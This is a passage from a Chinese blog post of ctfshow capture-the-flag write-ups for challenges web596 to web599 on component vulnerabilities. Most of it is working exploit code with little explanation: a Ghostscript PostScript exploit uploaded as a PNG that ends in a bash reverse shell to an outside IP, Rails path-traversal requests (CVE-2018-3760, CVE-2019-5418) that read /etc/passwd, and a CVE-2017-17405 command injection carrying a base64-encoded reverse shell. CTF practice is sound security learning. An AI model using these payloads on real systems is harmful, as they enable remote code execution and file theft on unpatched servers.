class="attribute">sec-fetch-user</span><span class="punctuation">: </span>?1</span><br><span class="line"><span class="attribute">referer</span><span class="punctuation">: </span>https://1783288b-d365-4d15-9514-69d3bcec3df3.challenge.ctf.show/</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="web596"><a href="#web596" class="headerlink" title="web596"></a>web596</h2><p><strong>Python PIL GhostButt</strong> 把下面的文件保存为png来上传即可RCE</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line">%!PS-Adobe-3.0 EPSF-3.0</span><br><span class="line">%%BoundingBox: -0 -0 100 100</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/size_from  10000      def</span><br><span class="line">/size_step    500      def</span><br><span class="line">/size_to   65000      def</span><br><span class="line">/enlarge    1000      def</span><br><span class="line"></span><br><span class="line">%/bigarr 65000 array def</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line">size_from size_step size_to &#123;</span><br><span class="line">    pop</span><br><span class="line">    1 add</span><br><span class="line">&#125; for</span><br><span class="line"></span><br><span class="line">/buffercount exch def</span><br><span class="line"></span><br><span class="line">/buffersizes buffercount array def</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">0</span><br><span class="line">size_from size_step size_to &#123;</span><br><span class="line">    buffersizes exch 2 index exch put</span><br><span class="line">    1 add</span><br><span class="line">&#125; for</span><br><span class="line">pop</span><br><span class="line"></span><br><span class="line">/buffers buffercount array def</span><br><span class="line"></span><br><span class="line">0 1 buffercount 1 sub &#123;</span><br><span class="line">    /ind exch def</span><br><span class="line">    buffersizes ind get /cursize exch def</span><br><span class="line">    cursize string /curbuf exch def</span><br><span class="line">    buffers ind curbuf put</span><br><span class="line">    cursize 16 sub 1 cursize 1 sub &#123;</span><br><span class="line">        curbuf exch 255 put</span><br><span class="line">    &#125; for</span><br><span class="line">&#125; for</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/buffersearchvars [0 0 0 0 0] def</span><br><span class="line">/sdevice [0] def</span><br><span class="line"></span><br><span class="line">enlarge array aload</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    .eqproc</span><br><span class="line">    buffersearchvars 0 buffersearchvars 0 get 1 add put</span><br><span class="line">    buffersearchvars 1 0 put</span><br><span class="line">    buffersearchvars 2 0 put</span><br><span class="line">    buffercount &#123;</span><br><span class="line">        buffers buffersearchvars 1 get get</span><br><span class="line">        buffersizes buffersearchvars 1 get get</span><br><span class="line">        16 sub get</span><br><span class="line">        254 le &#123;</span><br><span class="line">            buffersearchvars 2 1 put</span><br><span class="line">            buffersearchvars 3 buffers buffersearchvars 1 get get put</span><br><span class="line">            buffersearchvars 4 buffersizes buffersearchvars 1 get get 16 sub put</span><br><span class="line">        &#125; if</span><br><span class="line">        buffersearchvars 1 buffersearchvars 1 get 1 add put</span><br><span class="line">    &#125; repeat</span><br><span class="line"></span><br><span class="line">    buffersearchvars 2 get 1 ge &#123;</span><br><span class="line">        exit</span><br><span class="line">    &#125; if</span><br><span class="line">    %(.) print</span><br><span class="line">&#125; loop</span><br><span class="line"></span><br><span class="line">.eqproc</span><br><span class="line">.eqproc</span><br><span class="line">.eqproc</span><br><span class="line">sdevice 0</span><br><span class="line">currentdevice</span><br><span class="line">buffersearchvars 3 get buffersearchvars 4 get 16#7e put</span><br><span class="line">buffersearchvars 3 get buffersearchvars 4 get 1 add 16#12 put</span><br><span class="line">buffersearchvars 3 get buffersearchvars 4 get 5 add 16#ff put</span><br><span class="line">put</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">buffersearchvars 0 get array aload</span><br><span class="line"></span><br><span class="line">sdevice 0 get</span><br><span class="line">16#3e8 0 put</span><br><span class="line"></span><br><span class="line">sdevice 0 get</span><br><span class="line">16#3b0 0 put</span><br><span class="line"></span><br><span class="line">sdevice 0 get</span><br><span class="line">16#3f0 0 put</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">currentdevice null false mark /OutputFile (%pipe%bash -c &quot;bash -i&gt;&amp; /dev/tcp/156.238.233.9/9999 0&gt;&amp;1&quot;)</span><br><span class="line">.putdeviceparams</span><br><span class="line">1 true .outputpage</span><br><span class="line">.rsdparams</span><br><span class="line">%&#123; &#125; loop</span><br><span class="line">0 0 .quit</span><br><span class="line">%asdf</span><br></pre></td></tr></table></figure>

<h2 id="web597"><a href="#web597" class="headerlink" title="web597"></a>web597</h2><p> CVE-2018-3760</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/assets/file:%2f%2f/etc/passwd</span><br></pre></td></tr></table></figure>

<p>得到回显</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/passwd is no longer under a load path: /usr/src/blog/app/assets/config, /usr/src/blog/app/assets/images, /usr/src/blog/app/assets/javascripts, /usr/src/blog/app/assets/stylesheets, /usr/src/blog/vendor/assets/javascripts, /usr/src/blog/vendor/assets/stylesheets, /usr/local/bundle/gems/jquery-rails-4.3.3/vendor/assets/javascripts, /usr/local/bundle/gems/coffee-rails-4.2.2/lib/assets/javascripts, /usr/local/bundle/gems/actioncable-5.0.7/lib/assets/compiled, /usr/local/bundle/gems/turbolinks-source-5.2.0/lib/assets/javascripts</span><br></pre></td></tr></table></figure>

<p>那把路径给合上，并且用双层url编码绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/assets/file:%2f%2f/usr/src/blog/app/assets/images/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd</span><br></pre></td></tr></table></figure>

<h2 id="web598"><a href="#web598" class="headerlink" title="web598"></a>web598</h2><p>CVE-2019-5418</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/robots</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>b450f3cb-7357-4962-b2d3-9a5c022fbac9.challenge.ctf.show</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">sec-ch-ua</span><span class="punctuation">: </span>&quot;Not A(Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;132&quot;, &quot;Google Chrome&quot;;v=&quot;132&quot;</span><br><span class="line"><span class="attribute">sec-ch-ua-mobile</span><span class="punctuation">: </span>?0</span><br><span class="line"><span class="attribute">sec-ch-ua-platform</span><span class="punctuation">: </span>&quot;Windows&quot;</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>../../../../../../../../etc/passwd&#123;&#123;</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>none</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>navigate</span><br><span class="line"><span class="attribute">Sec-Fetch-User</span><span class="punctuation">: </span>?1</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>document</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br, zstd</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>cf_clearance=FfFkJ_rCEzOW7OasGYKDaQdTABU_BVynV76XtJXtEMk-1737092124-1.2.1.1-08wtjOyMUOY8ThDT33UiGmkBadSYm33GtZ8UEqnhMYn45iIQYIfmtkdn0rCEq2cLjGXf0XdRXNrM4molLyQ8vDQnKyYt1ixrhYI8wUqSsnE_reHQM3L6B3Gr67nSRP1zSwCAeJEqXOf02wzTlhdAoBkjyG4DbDdMuMDw6HuBeMCHow7p3zZfJTguhcrd.YRyR8ZagXt2h1DBgZSdnioehaLAzj2nA8s1weMd_HWveEI4ls1PWJz.ADM_9UTNjpCJL6Rlu3t3JqrqEctObC1eUoGYZYf3LWHGDpgLNPYoVjs; SL_G_WPT_TO=zh; SL_GWPT_Show_Hide_tmp=1; SL_wptGlobTipTmp=1</span><br><span class="line"><span class="attribute">If-Modified-Since</span><span class="punctuation">: </span>Mon, 18 Mar 2019 20:48:59 GMT</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="web599"><a href="#web599" class="headerlink" title="web599"></a>web599</h2><p>CVE-2017-17405</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install pyftpdlib</span><br><span class="line">python3 -m pyftpdlib -p 2121 -i 0.0.0.0</span><br></pre></td></tr></table></figure>

<p>然后打命令就可以了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 9999</span><br><span class="line"></span><br><span class="line">/download?uri=ftp://156.238.233.9:2121/&amp;file=|bash$&#123;IFS&#125;-c$&#123;IFS&#125;&#x27;&#123;echo,YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xNTYuMjM4LjIzMy45Lzk5OTkgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;</span><br></pre></td></tr></table></figure>




    </div>

    
    
    

    <footer class="post-footer">
          <div class="reward-container">
  <div>Buy me a coffee</div>
  <button>
    Donate
  </button>
  <div class="post-reward">
      <div>
        <img src="/images/wechat.png" alt="baozongwi reward">
        <span>reward</span>
      </div>

  </div>
</div>

          

<div class="post-copyright">
<ul>
  <li class="post-copyright-author">
      <strong>Post author:  </strong>baozongwi
  </li>
  <li class="post-copyright-link">
      <strong>Post link: </strong>
      <a href="https://baozongwi.xyz/posts/f8dfa163.html" title="ctfshow组件漏洞">https://baozongwi.xyz/posts/f8dfa163.html</a>
  </li>
  <li class="post-copyright-license">
      <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
  </li>
</ul>
</div>


        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/posts/f53c30e1.html" rel="prev" title="ctfshow的thinkphp专题(续集一)">
                  <i class="fa fa-angle-left"></i> ctfshow的thinkphp专题(续集一)
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/posts/5f1c9b28.html" rel="next" title="aliyunCTF2025">
                  aliyunCTF2025 <i class="fa fa-angle-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 2024 – 
    <span itemprop="copyrightYear">2025</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">baozongwi</span>
  </div>
<div class="wordcount">
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-line"></i>
    </span>
    <span title="Word count total">3.1m</span>
  </span>
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="Reading time total">87:21</span>
  </span>
</div>
<div class="busuanzi-count">
    <span class="post-meta-item" id="busuanzi_container_site_uv">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-item" id="busuanzi_container_site_pv">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a>
  </div>

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="back-to-top" role="button" aria-label="Back to top">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>

</body>
</html>
